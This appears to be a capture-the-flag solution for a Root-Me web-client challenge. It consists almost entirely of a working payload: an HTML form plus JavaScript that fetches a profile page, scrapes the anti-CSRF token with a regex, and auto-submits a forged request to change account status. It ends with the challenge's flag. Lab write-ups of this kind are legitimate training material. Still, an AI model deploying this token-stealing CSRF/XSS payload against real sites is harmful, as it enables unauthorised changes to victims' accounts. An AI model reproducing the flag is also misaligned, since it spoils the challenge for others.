/ch23/?action=contact
```
<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="user">
	<input id="status" type="checkbox" name="status" checked >
	<input id="token" type="hidden" name="token" value="" />
	<button type="submit">Submit</button>
</form>

<script>
	xhttp = new XMLHttpRequest();
	xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
	xhttp.send();
	token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
	document.getElementById('token').setAttribute('value', token_admin);
	document.csrf_form.submit();
</script>
```

/ch23/?action=private
> Good job dude, flag is : Byp4ss_CSRF_T0k3n-w1th-XSS

